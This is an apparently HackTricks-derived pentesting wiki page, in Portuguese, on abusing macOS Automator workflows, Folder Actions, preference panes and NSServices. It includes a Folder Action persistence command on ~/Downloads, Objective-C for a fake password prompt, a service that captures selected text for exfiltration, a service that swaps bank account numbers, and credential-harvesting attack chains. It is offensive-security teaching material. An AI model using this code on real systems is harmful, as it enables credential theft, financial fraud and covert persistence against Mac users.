# macOS Automator, Painéis de Preferências & NSServices Abuso

{{#include ../../../banners/hacktricks-training.md}}

## Ações e Workflows do Automator

### Informações Básicas

**Automator** é a ferramenta de automação visual do macOS. Ele executa **workflows** (`.workflow` bundles) compostos de **actions** (`.action` bundles). O Automator também alimenta **Folder Actions**, **Quick Actions**, e integração com **Shortcuts**.

Automator actions são **plugins** carregados no runtime do Automator quando um workflow é executado. Eles podem:
- Executar shell scripts arbitrários
- Processar arquivos e dados
- Interagir com aplicações via AppleScript
- Encadear entre si para automação complexa

### Por Que Isso Importa

> [!WARNING]
> Workflows do Automator podem ser **explorados por engenharia social** para execução — eles aparecem como arquivos de documento simples. Um bundle `.workflow` pode conter comandos de shell embutidos que são executados quando o workflow é executado. Combinados com Folder Actions, eles fornecem **persistência automática** que é acionada por eventos de arquivo.

### Descoberta
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Social-Engineered Workflow

Um pacote `.workflow` parece um arquivo de documento normal para a maioria dos usuários:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Ataque: Folder Action Persistence

Folder Actions executam automaticamente um fluxo de trabalho quando arquivos são adicionados a uma pasta monitorada:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Ações de Pasta persistem entre reinícios e executam-se silenciosamente. Uma Ação de Pasta em `~/Downloads` significa **todo arquivo baixado aciona seu payload** — incluindo arquivos do Safari, Chrome, AirDrop e anexos de e-mail.

---

## Painéis de Preferência

### Informações Básicas

Painéis de preferência (`.prefPane` bundles) são plugins carregados no **System Settings** (anteriormente System Preferences). Eles fornecem painéis de configuração da interface para recursos do sistema ou de terceiros.

### Por que isso importa

- Painéis de preferência são executados dentro do **processo System Settings**, que pode ter **permissões TCC elevadas** (acessibilidade, acesso total ao disco em alguns contextos)
- Painéis de preferência de terceiros são carregados nesse processo confiável, **herdando seu contexto de segurança**
- Usuários instalam painéis de preferência dando **duplo clique** neles — engenharia social fácil
- Uma vez instalados, eles **persistem** e são carregados toda vez que o System Settings abre naquele painel

### Descoberta
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

Um painel de preferências malicioso herda o contexto de segurança do System Settings:
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside System Settings process
// It has System Settings' TCC permissions

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Ataque: Persistência via Instalação
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Ataque: UI Phishing

Um painel de preferências pode imitar painéis legítimos da UI do sistema para **phish for credentials**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Informações Básicas

**NSServices** permitem que aplicações forneçam funcionalidades para outros aplicativos através do **menu Services** (clique com o botão direito → Services). Quando um usuário seleciona texto ou dados e invoca um serviço, os dados selecionados são **enviados ao provedor do serviço** para processamento.

Os serviços são declarados no `Info.plist` de um aplicativo sob a chave `NSServices` e registrados no servidor de pasteboard (`pbs`).

### Por que isso importa

- Os serviços recebem **fluxo de dados entre aplicações** — texto selecionado de qualquer aplicativo é enviado ao serviço
- Um serviço malicioso captura dados de gerenciadores de senhas, clientes de email, aplicativos financeiros
- Os serviços podem **retornar dados modificados** para o aplicativo chamador (man-in-the-middle em operações de seleção)
- Nomes de serviço podem ser criados para parecer legítimos ("Format Text", "Encrypt Selection", "Share")

### Descoberta
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Ataque: Serviço de Interceptação de Dados
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Attack: Data Modification (Man-in-the-Middle)

Um serviço pode **modify the returned data** enquanto aparenta fornecer uma função legítima:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
---

## Cadeias de Ataque entre Técnicas

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Painel de Preferências → Escalada TCC
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane runs inside System Settings context
4. Inherits System Settings' TCC grants
5. Access protected data, control other apps via inherited Accessibility
```
### NSService → Roubo de Gerenciador de Senhas
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Referências

* [Apple Developer — Automator Programming Guide](https://developer.apple.com/library/archive/documentation/AppleApplications/Conceptual/AutomatorConcepts/Automator.html)
* [Apple Developer — Preference Pane Programming Guide](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/PreferencePanes/Introduction/Introduction.html)
* [Apple Developer — Services Implementation Guide](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/SysServices/introduction.html)
* [Objective-See — Folder Action Persistence](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
